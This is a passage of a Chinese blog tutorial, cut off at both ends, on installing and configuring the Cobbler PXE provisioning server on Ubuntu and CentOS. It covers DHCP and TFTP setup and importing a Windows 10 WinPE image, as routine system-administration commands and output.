class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装依赖会报错</span><br>[root@node1.local ~]# apt-get install fence-agents xorriso python3-gunicorn python3-pymongo<br>eading package lists... Done<br>Building dependency tree... Done<br>Reading state information... Done<br>You might want to run <span class="hljs-string">&#x27;apt --fix-broken install&#x27;</span> to correct these.<br>The following packages have unmet dependencies:<br> cobbler : Depends: fence-agents but it is not going to be installed<br>           Depends: xorriso but it is not going to be installed<br>           Depends: python3-gunicorn but it is not going to be installed<br> python3-pymongo : Depends: python3-bson (= 3.11.0-1ubuntu0.24.04.1) but it is not going to be installed<br>                   Recommends: python3-gridfs (&gt;= 3.11.0-1ubuntu0.24.04.1) but it is not going to be installed<br>                   Recommends: python3-pymongo-ext but it is not going to be installed<br>E: Unmet dependencies. Try <span class="hljs-string">&#x27;apt --fix-broken install&#x27;</span> with no packages (or specify a solution).<br><br><br><span class="hljs-comment">#修复破损的依赖关系</span><br>[root@node1.local ~]# apt --fix-broken install<br><br><span class="hljs-comment">#安装成功</span><br>[root@node1.local ~]# apt-get install fence-agents xorriso python3-gunicorn python3-pymongo<br>Reading package lists... Done<br>Building dependency tree... Done<br>Reading state information... Done<br>fence-agents is already the newest version (4.12.1-2~exp1ubuntu4).<br>fence-agents <span class="hljs-built_in">set</span> to manually installed.<br>xorriso is already the newest version (1:1.5.6-1.1ubuntu3).<br>xorriso <span class="hljs-built_in">set</span> to manually installed.<br>python3-gunicorn is already the newest version (20.1.0-6).<br>python3-gunicorn <span class="hljs-built_in">set</span> to manually installed.<br>python3-pymongo is already the newest version (3.11.0-1ubuntu0.24.04.1).<br>python3-pymongo <span class="hljs-built_in">set</span> to manually installed.<br>0 upgraded, 0 newly installed, 0 to remove and 19 not upgraded.<br></code></pre></td></tr></table></figure><p>安装cobbler</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local cobbler]# dpkg -i /root/cobbler_3.4.0_all.deb<br>(Reading database ... 196119 files and directories currently installed.)<br>Preparing to unpack /root/cobbler_3.4.0_all.deb ...<br>Unpacking cobbler (3.4.0) over (3.4.0) ...<br>Setting up cobbler (3.4.0) ...<br>Processing triggers <span class="hljs-keyword">for</span> man-db (2.12.0-4build2) ...<br><br></code></pre></td></tr></table></figure><p>启动cobbler</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> /etc/cobbler/cobblerd.service /etc/systemd/system/<br><br>systemctl daemon-reload<br>systemctl start cobblerd<br>systemctl <span class="hljs-built_in">enable</span> cobblerd<br> <br>cobblerd check<br></code></pre></td></tr></table></figure><h2 id="三、centos安装"><a href="#三、centos安装" class="headerlink" title="三、centos安装"></a>三、centos安装</h2><p>参考地址：<a href="https://blog.swireb.cn/archives/docs-011">https://blog.swireb.cn/archives/docs-011</a></p><p>准备工作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#关闭防火墙和selinux</span><br>systemctl <span class="hljs-built_in">disable</span> firewalld.service<br>systemctl stop firewalld.service<br>sed -i <span class="hljs-string">&#x27;s/^SELINUX=.*/SELINUX=disabled/g&#x27;</span> /etc/selinux/config<br><br><span class="hljs-comment">#关闭了selinux需要重启服务器生效</span><br>reboot<br></code></pre></td></tr></table></figure><p>安装 EPEL 仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y epel-release<br></code></pre></td></tr></table></figure><p>更新仓库安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum update<br>yum install -y dhcp tftp-server xinetd debmirror pykickstart cobbler cobbler-web  <br><br><span class="hljs-comment">#组件作用简介</span><br>cobbler     <span class="hljs-comment">#基础组件</span><br>cobbler-web <span class="hljs-comment">#web组件</span><br>debmirror   <span class="hljs-comment">#镜像管理工具</span><br>pykickstart <span class="hljs-comment">#检查cobbler配置文件语法</span><br>httpd       <span class="hljs-comment">#发布镜像</span><br>syslinux    <span class="hljs-comment">#配置引导文件（生成pxelinux.0）</span><br>tftp-server <span class="hljs-comment">#为PXE的客户端提供引导文件</span><br>dhcp        <span class="hljs-comment">#为PXE的客户端提供IP地址、告知tftp的服务地址</span><br></code></pre></td></tr></table></figure><p>Cobbler目录文件简介</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpm -ql cobbler<br>/etc/cobbler                  <span class="hljs-comment">#配置文件目录</span><br>/etc/cobbler/settings         <span class="hljs-comment">#cobbler主配置文件</span><br>/etc/cobbler/dhcp.template    <span class="hljs-comment">#dhcp服务的配置模板</span><br>/etc/cobbler/tftpd.template   <span class="hljs-comment">#tftp服务的配置模板</span><br>/etc/cobbler/rsync.template   <span class="hljs-comment">#rsync服务的配置模板</span><br>/etc/cobbler/iso              <span class="hljs-comment">#iso模板配置文件目录</span><br>/etc/cobbler/pxe              <span class="hljs-comment">#pxe模板文件目录</span><br>/etc/cobbler/power            <span class="hljs-comment">#电源的配置文件目录</span><br>/etc/cobbler/users.conf       <span class="hljs-comment">#web服务授权配置文件</span><br>/etc/cobbler/users.digest     <span class="hljs-comment">#用于web访问的用户名密码配置文件</span><br>/etc/cobbler/dnsmasq.template <span class="hljs-comment">#dns服务的配置模板</span><br>/etc/cobbler/modules.conf     <span class="hljs-comment">#cobbler模块配置文件</span><br>/var/lib/cobbler              <span class="hljs-comment">#cobbler数据目录</span><br>/var/lib/cobbler/config       <span class="hljs-comment">#配置文件</span><br>/var/lib/cobbler/kickstarts   <span class="hljs-comment">#默认存放kickstart文件</span><br>/var/lib/cobbler/loaders      <span class="hljs-comment">#存放的各种引导程序</span><br>/var/www/cobbler              <span class="hljs-comment">#系统安装镜像目录</span><br>/var/www/cobbler/ks_mirror    <span class="hljs-comment">#导入的系统镜像列表</span><br>/var/www/cobbler/images       <span class="hljs-comment">#导入的系统镜像启动文件</span><br>/var/www/cobbler/repo_mirror  <span class="hljs-comment">#YUM源存储目录</span><br>/var/log/cobbler              <span class="hljs-comment">#日志目录</span><br>/var/log/cobbler/install.log  <span class="hljs-comment">#客户端系统安装日志</span><br>/var/log/cobbler/cobbler.log  <span class="hljs-comment">#cobbler日志 </span><br></code></pre></td></tr></table></figure><p>Cobbler主配置文件修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#生成密文密码</span><br>openssl passwd -1<br><br><span class="hljs-comment">#设置root密码</span><br>sed -i <span class="hljs-string">&#x27;s|^default_password_crypted.*|default_password_crypted: &quot;$1$Nrt/tXCR$BrRthh4tFphGyCunrGWzi/&quot;|g&#x27;</span> /etc/cobbler/settings<br><br><span class="hljs-comment">#设置指定tftp服务IP地址</span><br>sed -i <span class="hljs-string">&#x27;s|^next_server.*|next_server: 192.1.1.211|g&#x27;</span> /etc/cobbler/settings<br><br><span class="hljs-comment">#设置cobbler服务地址</span><br>sed -i <span class="hljs-string">&#x27;s|^server.*|server: 192.1.1.211|g&#x27;</span> /etc/cobbler/settings<br><br><span class="hljs-comment">#cobbler接管dhcp（0为关闭 1为开启）</span><br>sed -i <span class="hljs-string">&#x27;s|^manage_dhcp.*|manage_dhcp: 0|g&#x27;</span> /etc/cobbler/settings<br><br><span class="hljs-comment">#cobbler接管tftp（0为关闭 1为开启）</span><br>sed -i <span class="hljs-string">&#x27;s|^manage_tftpd.*|manage_tftpd: 1|g&#x27;</span> /etc/cobbler/settings<br>      <br><span class="hljs-comment">#cobbler启动服务</span><br>systemctl <span class="hljs-built_in">enable</span> --now httpd.service<br>systemctl <span class="hljs-built_in">enable</span> --now cobblerd.service<br></code></pre></td></tr></table></figure><p>Cobbler首次检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">cobbler check<br>1 : change <span class="hljs-string">&#x27;disable&#x27;</span> to <span class="hljs-string">&#x27;no&#x27;</span> <span class="hljs-keyword">in</span> /etc/xinetd.d/tftp<br>2 : Some network boot-loaders are missing from /var/lib/cobbler/loaders, you may run <span class="hljs-string">&#x27;cobbler get-loaders&#x27;</span> to download them, or, <span class="hljs-keyword">if</span> you only want to handle x86/x86_64 netbooting, you may ensure that you have installed a *recent* version of the syslinux package installed and can ignore this message entirely.  Files <span class="hljs-keyword">in</span> this directory, should you want to support all architectures, should include pxelinux.0, menu.c32, elilo.efi, and yaboot. The <span class="hljs-string">&#x27;cobbler get-loaders&#x27;</span> <span class="hljs-built_in">command</span> is the easiest way to resolve these requirements. <span class="hljs-comment">#可以忽略（确保系统已经安装pxelinux）</span><br>3 : <span class="hljs-built_in">enable</span> and start rsyncd.service with systemctl<br>4 : comment out <span class="hljs-string">&#x27;dists&#x27;</span> on /etc/debmirror.conf <span class="hljs-keyword">for</span> proper debian support<br>5 : comment out <span class="hljs-string">&#x27;arches&#x27;</span> on /etc/debmirror.conf <span class="hljs-keyword">for</span> proper debian support<br>6 : fencing tools were not found, and are required to use the (optional) power management features. install cman or fence-agents to use them <span class="hljs-comment">#可以忽略</span><br></code></pre></td></tr></table></figure><p>解决Cobbler检查报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#报错1问题解决</span><br><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF | tee /etc/xinetd.d/tftp</span><br><span class="hljs-string">service tftp</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">        socket_type             = dgram</span><br><span class="hljs-string">        protocol                = udp</span><br><span class="hljs-string">        wait                    = yes </span><br><span class="hljs-string">        user                    = root</span><br><span class="hljs-string">        server                  = /usr/sbin/in.tftpd</span><br><span class="hljs-string">        server_args             = -s /var/lib/tftpboot</span><br><span class="hljs-string">        disable                 = no</span><br><span class="hljs-string">        per_source              = 11</span><br><span class="hljs-string">        cps                     = 100 2</span><br><span class="hljs-string">        flags                   = IPv4</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment">#报错3问题解决</span><br>systemctl <span class="hljs-built_in">enable</span> --now rsyncd.service<br><br><span class="hljs-comment">#报错4、5问题解决</span><br>sed -i <span class="hljs-string">&#x27;s|@dists=.*|# @dists=|&#x27;</span> /etc/debmirror.conf <br>sed -i <span class="hljs-string">&#x27;s|@arches=.*|# @arches=|&#x27;</span> /etc/debmirror.conf<br></code></pre></td></tr></table></figure><p>Cobbler首次同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#再次运行检查</span><br>cobbler check<br>1 : Some network boot-loaders are missing from /var/lib/cobbler/loaders, you may run <span class="hljs-string">&#x27;cobbler get-loaders&#x27;</span> to download them, or, <span class="hljs-keyword">if</span> you only want to handle x86/x86_64 netbooting, you may ensure that you have installed a *recent* version of the syslinux package installed and can ignore this message entirely.  Files <span class="hljs-keyword">in</span> this directory, should you want to support all architectures, should include pxelinux.0, menu.c32, elilo.efi, and yaboot. The <span class="hljs-string">&#x27;cobbler get-loaders&#x27;</span> <span class="hljs-built_in">command</span> is the easiest way to resolve these requirements.<br><br><span class="hljs-comment">#cobbler首次同步</span><br>cobbler <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure><h2 id="四、配置dhcp服务"><a href="#四、配置dhcp服务" class="headerlink" title="四、配置dhcp服务"></a><strong>四、配置dhcp服务</strong></h2><p>Cobbler接管dhcp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/cobbler/dhcp.template  <br>subnet 10.99.88.0 netmask 255.255.255.0 &#123;<br>     <span class="hljs-comment"># option routers             10.99.88.55;</span><br>     <span class="hljs-comment"># option domain-name-servers 127.0.0.1;</span><br>     option subnet-mask         255.255.255.0;<br>     range dynamic-bootp        10.99.88.100 10.99.88.254;<br>     default-lease-time         21600;<br>     max-lease-time             43200;<br>     next-server                <span class="hljs-variable">$next_server</span>;<br>     class <span class="hljs-string">&quot;pxeclients&quot;</span> &#123;<br>          match <span class="hljs-keyword">if</span> substring (option vendor-class-identifier, 0, 9) = <span class="hljs-string">&quot;PXEClient&quot;</span>;<br>          <span class="hljs-keyword">if</span> option pxe-system-type = 00:02 &#123;<br>                  filename <span class="hljs-string">&quot;ia64/elilo.efi&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> option pxe-system-type = 00:06 &#123;<br>                  filename <span class="hljs-string">&quot;grub/grub-x86.efi&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> option pxe-system-type = 00:07 &#123;<br>                  filename <span class="hljs-string">&quot;grub/grub-x86_64.efi&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> option pxe-system-type = 00:09 &#123;<br>                  filename <span class="hljs-string">&quot;grub/grub-x86_64.efi&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>                  filename <span class="hljs-string">&quot;pxelinux.0&quot;</span>;<br>          &#125;<br>     &#125;<br><br>&#125;<br>    <br><span class="hljs-comment">#cobbler主配置文件开启dhcp接管</span><br>sed -i <span class="hljs-string">&#x27;s|^manage_dhcp.*|manage_dhcp: 1|g&#x27;</span> /etc/cobbler/settings <br><br><span class="hljs-comment">#重新同步</span><br>systemctl restart cobblerd.service<br>cobbler <span class="hljs-built_in">sync</span>  <br><br><span class="hljs-comment">#启动dhcp服务</span><br>systemctl <span class="hljs-built_in">enable</span> --now dhcpd.service <br>systemctl restart dhcpd.service<br></code></pre></td></tr></table></figure><p>使用现有dhcp服务器–&gt;定义了上面的模板下面会自动获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#修改dhcp配置文件</span><br>vim /etc/dhcp/dhcpd.conf <br>subnet 10.99.88.0 netmask 255.255.255.0 &#123;<br>     <span class="hljs-comment"># option routers             10.99.88.55;</span><br>     <span class="hljs-comment"># option domain-name-servers 127.0.0.1;</span><br>     option subnet-mask         255.255.255.0;<br>     range dynamic-bootp        10.99.88.100 10.99.88.254;<br>     default-lease-time         21600;<br>     max-lease-time             43200;<br>     next-server                192.1.1.211;<br>     class <span class="hljs-string">&quot;pxeclients&quot;</span> &#123;<br>          match <span class="hljs-keyword">if</span> substring (option vendor-class-identifier, 0, 9) = <span class="hljs-string">&quot;PXEClient&quot;</span>;<br>          <span class="hljs-keyword">if</span> option pxe-system-type = 00:02 &#123;<br>                  filename <span class="hljs-string">&quot;ia64/elilo.efi&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> option pxe-system-type = 00:06 &#123;<br>                  filename <span class="hljs-string">&quot;grub/grub-x86.efi&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> option pxe-system-type = 00:07 &#123;<br>                  filename <span class="hljs-string">&quot;grub/grub-x86_64.efi&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> option pxe-system-type = 00:09 &#123;<br>                  filename <span class="hljs-string">&quot;grub/grub-x86_64.efi&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>                  filename <span class="hljs-string">&quot;pxelinux.0&quot;</span>;<br>          &#125;<br>     &#125;<br><br>&#125;<br><span class="hljs-comment">#启动dhcp服务</span><br>systemctl <span class="hljs-built_in">enable</span> --now dhcpd.service <br>systemctl restart dhcpd.service<br></code></pre></td></tr></table></figure><h2 id="五、其他相关服务配置"><a href="#五、其他相关服务配置" class="headerlink" title="五、其他相关服务配置"></a><strong>五、其他相关服务配置</strong></h2><p>配置tftp服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#确保tftp的站点目录存在引导文件（cobbler检查问题的过程中已经修了tftp的配置文件）</span><br>ll /var/lib/tftpboot/<br>drwxr-xr-x  3 root root   4096 Mar  1 23:54 boot<br>drwxr-xr-x. 2 root root   4096 Oct 15  2019 etc<br>drwxr-xr-x. 2 root root   4096 Mar  1 23:54 grub  <span class="hljs-comment">#UEFI启动菜单目录</span><br>drwxr-xr-x. 7 root root   4096 Mar  1 23:54 images<br>drwxr-xr-x. 2 root root   4096 Oct 15  2019 images2<br>-rw-r--r--. 2 root root  26140 Oct 31  2018 memdisk<br>-rw-r--r--. 2 root root  54964 Mar  1 23:54 menu.c32<br>drwxr-xr-x. 2 root root   4096 Oct 15  2019 ppc<br>-rw-r--r--. 2 root root  16794 Mar  1 23:54 pxelinux.0<br>drwxr-xr-x. 2 root root   4096 Mar  1 23:56 pxelinux.cfg <span class="hljs-comment">#BIOS启动菜单目录</span><br>drwxr-xr-x. 2 root root   4096 Mar  1 23:54 s390x<br>-rw-r--r--  2 root root 198236 Feb  8 15:17 yaboot<br><br><span class="hljs-comment">#启动tftp服务</span><br>systemctl <span class="hljs-built_in">enable</span> --now tftp.service  <br>systemctl <span class="hljs-built_in">enable</span> --now xinetd.service<br>systemctl restart tftp.service <br>systemctl restart xinetd.service<br></code></pre></td></tr></table></figure><h2 id="六、配置-Cobbler-Server"><a href="#六、配置-Cobbler-Server" class="headerlink" title="六、配置 Cobbler Server"></a>六、配置 Cobbler Server</h2><p>参考地址：<a href="https://anjia0532.github.io/2019/02/22/cobbler-win10-win-server-2019/">https://anjia0532.github.io/2019/02/22/cobbler-win10-win-server-2019/</a></p><h4 id="导入-Cobbler"><a href="#导入-Cobbler" class="headerlink" title="导入 Cobbler"></a>导入 Cobbler</h4><p>使用 WinScp 等工具，将 winpe_win10_amd64.iso 上传到 Cobbler 服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]# cobbler distro add --name=windows_10_x64 --kernel=/var/lib/tftpboot/memdisk --initrd=/root/winpe_win10_amd64.iso --kopts=<span class="hljs-string">&quot;raw iso&quot;</span><br>[root@localhost ~]# <span class="hljs-built_in">touch</span> /var/lib/cobbler/kickstarts/winpe.xml<br>[root@localhost ~]# cobbler profile add --name=windows_10_x64 --distro=windows_10_x64 --kickstart=/var/lib/cobbler/kickstarts/winpe.xml<br></code></pre></td></tr></table></figure><h4 id="创建自动应答文件"><a href="#创建自动应答文件" class="headerlink" title="创建自动应答文件"></a>创建自动应答文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span 